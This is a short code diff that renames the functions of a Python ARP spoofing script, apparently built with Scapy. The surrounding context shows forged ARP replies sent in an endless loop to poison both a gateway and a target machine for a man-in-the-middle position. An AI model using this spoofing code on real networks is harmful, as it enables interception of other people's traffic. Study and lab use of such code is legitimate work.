@@ -19,7 +19,7 @@ print(b)
 
 
 #####  Playing with an ARP packet. Trying to poison a specified machine  #####
-def poisonGateway():
+def impersonateTarget():
     # Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
     poisonedGateway = ARP()
     poisonedGateway.op = 2
@@ -29,7 +29,7 @@ def poisonGateway():
     send(poisonedGateway, verbose=False)
 
 
-def poisonTarget():
+def impersonateGateway():
     poisonedTarget = ARP()
 
     # Simulate that this is a response packet (who-has(1) / is-at(2));
@@ -46,6 +46,6 @@ def poisonTarget():
     send(poisonedTarget, verbose=False)
 
 while True:
-    poisonTarget()
-    poisonGateway()
+    impersonateGateway()
+    impersonateTarget()
     time.sleep(2)
